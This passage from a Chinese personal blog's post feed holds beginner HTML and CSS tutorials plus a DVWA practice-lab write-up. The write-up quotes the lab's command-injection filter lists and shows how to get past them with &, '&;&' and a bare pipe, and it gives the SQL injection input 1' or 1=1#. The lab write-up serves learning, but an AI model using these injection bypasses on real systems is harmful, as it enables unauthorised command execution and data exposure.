<li>代码示例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;style &gt;</span><br><span class="line">.charal&#123;font-size:15px; background-color: #90bcff;width: 600px&#125;</span><br><span class="line">.charal td&#123;text-align: center;&#125;</span><br><span class="line">a:link&#123;color: #005799; text-decoration: none;&#125;</span><br><span class="line">a:visited&#123;color: #000000;text-decoration: none; &#x2F;*无下划线*&#x2F;&#125;</span><br><span class="line">a:hover&#123;color: #FFFF00; text-decoration: underline;&#x2F;*有下划线*&#x2F;&#125;</span><br><span class="line">a:active&#123;color: #FF0000; text-decoration: underline;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;table class&#x3D;&quot;charal&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;a href&#x3D;&quot;#&quot;&gt;首页&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;a href&#x3D;&quot;#&quot;&gt;no1&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;a href&#x3D;&quot;#&quot;&gt;no2&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;a href&#x3D;&quot;#&quot;&gt;no3&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;a href&#x3D;&quot;#&quot;&gt;no4&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA修炼日记1.0</title>
    <url>/2018/05/30/DVWA%E4%BF%AE%E7%82%BC%E6%97%A5%E8%AE%B01-0/</url>
    <content><![CDATA[<h1 id="DVWA修炼日记第一篇"><a href="#DVWA修炼日记第一篇" class="headerlink" title="DVWA修炼日记第一篇"></a>DVWA修炼日记第一篇</h1><p>最近好久没更新博客了，是因为最近一直忙着做课程设计,用的thinkphp框架做含有漏洞的博客，同时使用docker发布…<br>可以说是有点复杂了…<br>闲话不多说，开始我们今天的学习之旅.</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>命令注入，可以通过&amp;&amp;或&amp;进行命令的连接.<br>Command 1&amp;&amp;Command 2：先执行Command 1，执行成功后执行Command 2，否则不执行Command 2<br>Command 1&amp;Command 2:先执行Command 1，不管是否成功，都会执行Command 2</p>
<p>###low<br>最低安全等级，没有任何过滤，所以直接通过&amp;&amp;连接命令执行.<br><img src="/uploads/dv2.png" alt="1"></p>
<p>###medium<br>查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$substitutions &#x3D; array( </span><br><span class="line">        &#39;&amp;&amp;&#39; &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;, </span><br><span class="line">    ); </span><br><span class="line">过滤了&amp;&amp;和；</span><br></pre></td></tr></table></figure>
<p>但是我们依旧可以通过&amp;连接命令执行.或者Command 1&amp;;&amp;Command 2,过滤掉;变成Command 1&amp;&amp;Command 2.<br><img src="/uploads/dv3.png" alt="1"></p>
<p>###high<br>查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$substitutions &#x3D; array( </span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;, </span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;, </span><br><span class="line">    ); </span><br><span class="line">对如上字符进行了过滤，但是&#39;| &#39;此处过滤是过滤了|加空格，所有过滤不完整，我们直接使用|就可。</span><br><span class="line">Command 1 | Command 2:“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</span><br></pre></td></tr></table></figure>
<p><img src="/uploads/dv4.png" alt="1"></p>
<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>###low<br>输入用户id可以查看用户的信息。<br>尝试注入1’ or 1=1# ,可以返回全部用户的信息<br><img src="/uploads/dv1.png" alt="1"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>CSRF</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML基础学习1.0</title>
    <url>/2018/02/11/HTML%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A01-0/</url>
    <content><![CDATA[<p>HTML的基本结构和块级标签的运用。</p>
<a id="more"></a>
<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="HTML框架"><a href="#HTML框架" class="headerlink" title="HTML框架"></a>HTML框架</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">   &lt;title&gt;first text&lt;&#x2F;title&gt;</span><br><span class="line">      &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">      &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;gb2312&quot;&gt;</span><br><span class="line">      &lt;meta name&#x3D;&quot;keywords&quot; contnet&#x3D;&quot;测试&quot;&gt;</span><br><span class="line">      &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;一次测试&quot;&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line">     你好啊</span><br><span class="line">   &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="head标签内常用的元素"><a href="#head标签内常用的元素" class="headerlink" title="head标签内常用的元素"></a>head标签内常用的元素</h2><ul>
<li><code>&lt;title&gt;</code>该元素用于定义文档标题</li>
<li><code>&lt;script&gt;</code>该元素用于包含JavaScript脚本</li>
<li><code>&lt;link&gt;</code>该元素用于链接外部css资源文件</li>
<li><code>&lt;style&gt;</code>该元素用于定义内部css样式</li>
<li><code>&lt;meta&gt;</code>该元素用于HTML页面的元数据</li>
</ul>
<h2 id="常用块级标签"><a href="#常用块级标签" class="headerlink" title="常用块级标签"></a>常用块级标签</h2><ul>
<li>标题标签<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;一级标题&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2&gt;二级标题&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;h3&gt;三级标题&lt;&#x2F;h3&gt;</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure></li>
<li>段落标签<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">     &lt;h1&gt;一级标题&lt;&#x2F;h1&gt;</span><br><span class="line">     &lt;p&gt;段落一&lt;&#x2F;p&gt;</span><br><span class="line">     &lt;p&gt;段落二&lt;&#x2F;p&gt;</span><br><span class="line">     &lt;h2&gt;二级标题&lt;&#x2F;h2&gt;</span><br><span class="line">     &lt;h3&gt;三级标题&lt;&#x2F;h3&gt;</span><br><span class="line">   &lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure></li>
<li>水平线标签<br><code>&lt;hr/&gt;</code>相当于加了一条分割线<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">     &lt;h1&gt;一级标题&lt;&#x2F;h1&gt;</span><br><span class="line">     &lt;p&gt;段落一&lt;&#x2F;p&gt;</span><br><span class="line">     &lt;p&gt;段落二&lt;&#x2F;p&gt;</span><br><span class="line">     &lt;hr&#x2F;&gt;</span><br><span class="line">     &lt;h2&gt;二级标题&lt;&#x2F;h2&gt;</span><br><span class="line">     &lt;h3&gt;三级标题&lt;&#x2F;h3&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure></li>
<li>有序列表标签<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">  &lt;li&gt;列表项一&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li&gt;列表项二&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li&gt;列表项三&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ol&gt;</span><br></pre></td></tr></table></figure></li>
<li>无序列表<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">  &lt;li&gt;列表一&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li&gt;列表二&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li&gt;列表三&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure></li>
<li>定义描述标签<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">  &lt;dt&gt;标题&lt;&#x2F;dt&gt;</span><br><span class="line">  &lt;dd&gt;描述1&lt;&#x2F;dd&gt;</span><br><span class="line">&lt;&#x2F;dl&gt;</span><br></pre></td></tr></table></figure>
<h2 id="分区标签"><a href="#分区标签" class="headerlink" title="分区标签"></a>分区标签</h2><code>div</code>标签一般当做结构化块状元素使用，<br>一般最常见的用途是对网页进行整体分块<br>布局，即当容器来使用。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;头部内容&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div&gt;导航内容&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div&gt;底部内容&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<h2 id="演示效果："><a href="#演示效果：" class="headerlink" title="演示效果："></a>演示效果：</h2><img src="/uploads/zongji.png" alt="a"></li>
</ul>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML基础学习3.0</title>
    <url>/2018/02/23/HTML%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A03-0/</url>
    <content><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="form标签"><a href="#form标签" class="headerlink" title="form标签"></a>form标签</h2><ul>
<li><p>form标签的语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;表单提交地址&quot; method&#x3D;&quot;提交方法&quot;&gt;</span><br><span class="line">...文本框、按钮等表单元素...</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>form标签常用属性</p>
<blockquote>
<p>1.action:指定表单提交后由服务器上的哪个处理程序进行处理<br>2.enctype：用于指定表单数据的编码方式<br>  2-1.application/x-www-form-urlencoded:默认的编码方式，将表单控件中的值处理成URL编码方式。<br>  2-2.mutipart/form-data:以二进制流的方式来处理表单数据。<br>  2-3.text/plain:当表单的action属性值为<code>mailto:URL</code>的形式时使用。<br>3.method:指定向服务器提交的方式一般为get和post两种方式<br>  get：get方式的请求会将请求参数的名和值转换成字符串，并附加在原URL之后，因此可以在地址栏中看到的请求参数的名与值。且get请求传送的数据量比较小，一般不能大于2kb。<br>  post：post方式的请求的数据量比较大，通常认为可以不受限制，往往取决于副武器的限制。post方式的请求参数是放在HTML的HEADER中传输，用户在地址栏中看不到请求参数，安全性相对较高。</p>
</blockquote>
</li>
<li><p>使用input元素</p>
<blockquote>
<p>单行文本框：指定&lt;input…/&gt;元素的type属性为text即可<br>密码输入框：指定&lt;input…/&gt;元素的type属性为password即可<br>隐藏域：指定&lt;input…/&gt;元素的type属性为hidden即可<br>单选框：指定&lt;input…/&gt;元素的type属性为radio即可<br>复选框：指定&lt;input…/&gt;元素的type属性为checkbox即可<br>图像域：指定&lt;input…/&gt;元素的type属性为image即可，当type=”image”的时，可以指定width和height属性<br>文件上传域：指定&lt;input…/&gt;元素的type属性为file即可<br>提交、重置、普通按钮：指定&lt;input…/&gt;元素的type属性为submit、reset或button即可</p>
</blockquote>
</li>
<li><p>input元素常用的几个属性</p>
<blockquote>
<p>checked:设置单选框、复选框初始状态，只有当type属性值为checked或radio时才可指定。<br>disabled：设置首次加载时禁用此元素。当type=”hidden”时不能指定该属性<br>maxlength：该属性是一个数字，指定文本框中所允许输入的最大字符数<br>readonly:指出该文本框内的值不允许修改(可以用JavaScript脚本修改)<br>size：该属性是一个数字，指定该元素的长度。当type=”hidden”时不能指定该属性<br>src:指定图像域所显示的图像URL，只要当type=”image”时才可以指定该属性。</p>
</blockquote>
</li>
<li><p>代码演示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form name&#x3D;&quot;regForm&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;</span><br><span class="line">    单选文本框&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;name&quot; maxlength&#x3D;&quot;3&quot; &#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">    密码框&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; id&#x3D;&quot;password&quot; size&#x3D;&quot;2&quot; &#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">    隐藏域&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;hidden&quot; id&#x3D;&quot;hidden&quot;&#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">    单选按钮&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;sex&quot; id&#x3D;&quot;male&quot;&#x2F;&gt;男</span><br><span class="line">            &lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;sex&quot; id&#x3D;&quot;female&quot; checked&#x3D;&quot;checked&quot; &#x2F;&gt;女&lt;&#x2F;br&gt;</span><br><span class="line">    复选框&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;1&quot; id&#x3D;&quot;1&quot;&#x2F;&gt;1</span><br><span class="line">         &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot;  value&#x3D;&quot;2&quot; id&#x3D;&quot;2&quot; disabled&#x3D;&quot;disabled&quot; &#x2F;&gt;2</span><br><span class="line">         &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot;  value&#x3D;&quot;3&quot; id&#x3D;&quot;3&quot;&#x2F;&gt;3&lt;&#x2F;br&gt;</span><br><span class="line">    图像域&lt;input type&#x3D;&quot;image&quot; name&#x3D;&quot;111&quot; src&#x3D;&quot;IMG_1947.JPG&quot; width&#x3D;&quot;100px&quot; height&#x3D;&quot;100px&quot;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">    文件上传域&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot;&#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">    提交按钮&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">    重置按钮&lt;input type&#x3D;&quot;reset&quot; name&#x3D;&quot;reset&quot; value&#x3D;&quot;重置&quot;&#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">    普通按钮&lt;input type&#x3D;&quot;button&quot; name&#x3D;&quot;button&quot; value&#x3D;&quot;普通&quot;&#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class="line"> &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/uploads/1.png" alt="a"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML基础学习2.0</title>
    <url>/2018/02/12/HTML%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A02-0/</url>
    <content><![CDATA[<p>HTML行级标签的运用。</p>
<a id="more"></a>
<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="行级标签"><a href="#行级标签" class="headerlink" title="行级标签"></a>行级标签</h2><ul>
<li><p>按行逐一显示，前后不会自动换行；</p>
</li>
<li><p>文本格式化元素</p>
<blockquote>
<p><code>&lt;b&gt;</code>定义粗体文本<br><code>&lt;i&gt;</code>定义斜体文本<br><code>&lt;em&gt;</code>定义强调文本，实际效果与斜体文本差不多<br><code>&lt;strong&gt;</code>定义粗体文本，与<code>&lt;b&gt;</code>的作用基本相同<br><code>&lt;small&gt;</code>定义小号文本<br><code>&lt;sub&gt;</code>定义下标文本<br><code>&lt;sup&gt;</code>定义上标文本<br><code>&lt;bdo&gt;</code>定义文本显示方向，内有dir属性，只能取值ltr或rtl</p>
</blockquote>
</li>
<li><p>超链接标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;链接地址&quot; target&#x3D;&quot;目标窗口&quot;&gt;链接文本或图片&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>常用属性:</p>
<blockquote>
<p>href:指超链接所关联的另一个资源<br>target：指定框架中的哪个框架来装<br>载另一个资源，该属性可以是_self、<br>_blank、_top、_parent四个值，分别<br>代表使用自身、新窗口、顶层框架、父框<br>架来装载新资源。</p>
</blockquote>
</li>
<li><p>图像标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;图片地址&quot; alt&#x3D;&quot;提示文字&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><p><span>标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;span&gt;文本等行级内容&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure></li>
<li><p><br/>标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;br&#x2F;&gt;换行</span><br></pre></td></tr></table></figure></li>
<li><p>常用的特殊符号</p>
<blockquote>
<p>空格:<code>&amp;nbsp;</code><br>大于:<code>&amp;gt;</code><br>小于:<code>&amp;lt;</code><br>引号:<code>&amp;quot;</code><br>版权号:<code>&amp;copy;</code></p>
</blockquote>
</li>
</ul>
<h2 id="frameset内嵌框架集"><a href="#frameset内嵌框架集" class="headerlink" title="frameset内嵌框架集"></a>frameset内嵌框架集</h2><ul>
<li><frameset>框架集标签中的常用属性

</li>
</ul>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>cols</td>
<td>pixels、%(占屏幕的大小的百分比)、*(剩余的大小)</td>
<td>定义框架集中列的数目和尺寸</td>
</tr>
<tr>
<td>rows</td>
<td>pixels、%、*</td>
<td>定义框架集中行的数目和尺寸</td>
</tr>
</tbody></table>
<ul>
<li><p>例如：水平框架</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;frameset rows&#x3D;&quot;25%,50%,*&quot;&gt;</span><br><span class="line"> &lt;frame src&#x3D;&quot;&#x2F;example&#x2F;html&#x2F;frame_a.html&quot;&gt;</span><br><span class="line"> &lt;frame src&#x3D;&quot;&#x2F;example&#x2F;html&#x2F;frame_a.html&quot;&gt;</span><br><span class="line"> &lt;frame src&#x3D;&quot;&#x2F;example&#x2F;html&#x2F;frame_a.html&quot;&gt;</span><br><span class="line">&lt;&#x2F;frameset&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>注意</p>
<frameset></frameset>标签不能与<body></body>标签同时使用。
除非你在<frameset>中使用<noframes>标签
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;frameset&gt;</span><br><span class="line"> &lt;noframes&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  ...</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line"> &lt;&#x2F;noframes&gt;</span><br><span class="line">&lt;&#x2F;frameset&gt;</span><br></pre></td></tr></table></figure>
## iframe内嵌框架
</li>
<li><p>iframe标签中的常用属性</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>frameborder</td>
<td>0、1</td>
<td>规定是否显示框架周边的边框</td>
</tr>
<tr>
<td>name</td>
<td>frame_name</td>
<td>规定iframe的名称</td>
</tr>
<tr>
<td>scrolling</td>
<td>yes、no、auto</td>
<td>规定是否在iframe中显示滚动条</td>
</tr>
<tr>
<td>src</td>
<td>URL</td>
<td>规定在iframe中显示的文档的URL</td>
</tr>
</tbody></table>
<ul>
<li>iframe语法<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;iframe src&#x3D;&quot;引用页面地址&quot; name&#x3D;&quot;框架标识名&quot;</span><br><span class="line"> frameborder&#x3D;&quot;边框&quot; scrolling&#x3D;&quot;yes&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML基础学习4.0</title>
    <url>/2018/02/24/HTML%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A04-0/</url>
    <content><![CDATA[<h1 id="HTML常用的表单元素"><a href="#HTML常用的表单元素" class="headerlink" title="HTML常用的表单元素"></a>HTML常用的表单元素</h1><h2 id="button按钮"><a href="#button按钮" class="headerlink" title="button按钮"></a>button按钮</h2><ul>
<li>使用button定义按钮<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button type&#x3D;&quot;按钮类型&quot;&gt;</span><br><span class="line">普通文本、格式换文本、图像</span><br><span class="line">&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure></li>
<li>button标签常用属性</li>
</ul>
<blockquote>
<p>disabled:指定是否禁用此元素。该属性只能是disabled或者省略<br>name:指定该按钮的唯一名称<br>type:制定该按钮属于哪种按钮，只能是button、reset、submit</p>
</blockquote>
<p>总结：button按钮与input按钮相比，提供了更强大的功能和更丰富的内容。</p>
<h2 id="label标签"><a href="#label标签" class="headerlink" title="label标签"></a>label标签</h2><p>点击该标签，该标签就会关联到表单空间元素上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;label for&#x3D;&quot;需要关联的表单元素id&quot;&gt;xxx&lt;&#x2F;label&gt;</span><br></pre></td></tr></table></figure>
<p>代码示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;label for&#x3D;&quot;name&quot; &gt;单选文本框&lt;&#x2F;label&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;name&quot; maxlength&#x3D;&quot;3&quot; &#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">button提交按钮&lt;button type&#x3D;&quot;submit&quot;name&#x3D;&quot;submit2&quot;&gt;&lt;b&gt;提交按钮&lt;&#x2F;b&gt;&lt;&#x2F;button&gt;&lt;&#x2F;br&gt; #粗体格式化</span><br><span class="line">button重置按钮&lt;button type&#x3D;&quot;reset&quot;name&#x3D;&quot;sreset2&quot;&gt;&lt;i&gt;重置按钮&lt;&#x2F;i&gt;&lt;&#x2F;button&gt;&lt;&#x2F;br&gt;  #斜体格式化</span><br><span class="line">button普通按钮&lt;button type&#x3D;&quot;button&quot;name&#x3D;&quot;button2&quot; disabled&#x3D;&quot;disabled&quot;&gt;普通按钮&lt;&#x2F;button&gt;&lt;&#x2F;br&gt; #禁用按钮</span><br></pre></td></tr></table></figure>
<h2 id="列表框和下拉菜单"><a href="#列表框和下拉菜单" class="headerlink" title="列表框和下拉菜单"></a>列表框和下拉菜单</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;select name&#x3D;&quot;指定列表名称&quot; size&#x3D;&quot;行数&quot;&gt;</span><br><span class="line">&lt;option value&#x3D;&quot;选项值&quot; selected&#x3D;&quot;selected&quot;&gt;...&lt;&#x2F;option&gt;</span><br><span class="line">&lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>列表框常用属性</li>
</ul>
<blockquote>
<p>disable:指定是否禁用此元素。该属性只能是disabled或者省略<br>mutiple:设置该列表框是否允许多选<br>size:指定该列表内同时显示多少个列表项</p>
</blockquote>
<ul>
<li>在&lt;select…/&gt;元素里面，只能包含如下两种子元素</li>
</ul>
<blockquote>
<p>1.<code>&lt;option&gt;</code>定义列表框选项或菜单项<br>  属性：disabled(禁用该选项)、selected(选中该选项)、value(请求参数值)<br>2.<code>&lt;optgroup&gt;</code>定义列表项或菜单项组<br>  属性：label(该选项组的标签，必填)、disabled(禁用该选项)</p>
</blockquote>
<p>代码示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下拉菜单&lt;br&gt;</span><br><span class="line">    &lt;select name&#x3D;&quot;city&quot; id&#x3D;&quot;city1&quot;&gt;</span><br><span class="line">       &lt;option&gt;北京&lt;&#x2F;option&gt;</span><br><span class="line">       &lt;option selected&#x3D;&quot;selected&quot;&gt;上海&lt;&#x2F;option&gt;</span><br><span class="line">       &lt;option disabled&#x3D;&quot;disabled&quot;&gt;南京&lt;&#x2F;option&gt;</span><br><span class="line">       &lt;option&gt;广州&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;&#x2F;select&gt;&lt;br&gt;</span><br><span class="line">列表框&lt;br&gt;</span><br><span class="line">    &lt;select name&#x3D;&quot;city&quot; id&#x3D;&quot;city2&quot; size&#x3D;&quot;3&quot; &gt;</span><br><span class="line">       &lt;option&gt;北京&lt;&#x2F;option&gt;</span><br><span class="line">       &lt;option selected&#x3D;&quot;selected&quot;&gt;上海&lt;&#x2F;option&gt;</span><br><span class="line">       &lt;option disabled&#x3D;&quot;disabled&quot;&gt;南京&lt;&#x2F;option&gt;</span><br><span class="line">       &lt;option&gt;广州&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;&#x2F;select&gt;&lt;br&gt;</span><br><span class="line">选项组列表框&lt;br&gt;</span><br><span class="line">   &lt;select name&#x3D;&quot;city&quot; id&#x3D;&quot;city3&quot; size&#x3D;&quot;6&quot;&gt;</span><br><span class="line">       &lt;optgroup label&#x3D;&quot;一线城市&quot;&gt;</span><br><span class="line">        &lt;option&gt;北京&lt;&#x2F;option&gt;</span><br><span class="line">        &lt;option selected&#x3D;&quot;selected&quot;&gt;上海&lt;&#x2F;option&gt;</span><br><span class="line">       &lt;&#x2F;optgroup&gt;</span><br><span class="line"></span><br><span class="line">       &lt;optgroup label&#x3D;&quot;二线城市&quot;&gt;</span><br><span class="line">        &lt;option&gt;南京&lt;&#x2F;option&gt;</span><br><span class="line">        &lt;option selected&#x3D;&quot;selected&quot;&gt;杭州&lt;&#x2F;option&gt;</span><br><span class="line">        &lt;option&gt;大连&lt;&#x2F;option&gt;</span><br><span class="line">       &lt;&#x2F;optgroup&gt;</span><br><span class="line">   &lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>
<h2 id="多行文本框"><a href="#多行文本框" class="headerlink" title="多行文本框"></a>多行文本框</h2><ul>
<li>多行文本框语法<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;textarea name&#x3D;&quot;...&quot; cols&#x3D;&quot;列宽&quot; rows&#x3D;&quot;行宽&quot;&gt;</span><br><span class="line"> 文本内容</span><br><span class="line">&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure></li>
<li>多行文本常用属性</li>
</ul>
<blockquote>
<p>cols：文本框宽度<br>rows：文本框高度<br>readonly：只读</p>
</blockquote>
<ul>
<li>代码示例<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">多行文本框&lt;br&gt;</span><br><span class="line">   &lt;textarea name&#x3D;&quot;content&quot; cols&#x3D;&quot;28&quot; rows&#x3D;&quot;4&quot; readonly&#x3D;&quot;readonly&quot;&gt;</span><br><span class="line">   1.要求1</span><br><span class="line">   2.要求2</span><br><span class="line">   3.要求3</span><br><span class="line">   &lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown学习总结</title>
    <url>/2018/02/09/Markdown%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p>主要介绍了Markdown的基础语法，用于编辑博客。</p>
<a id="more"></a>

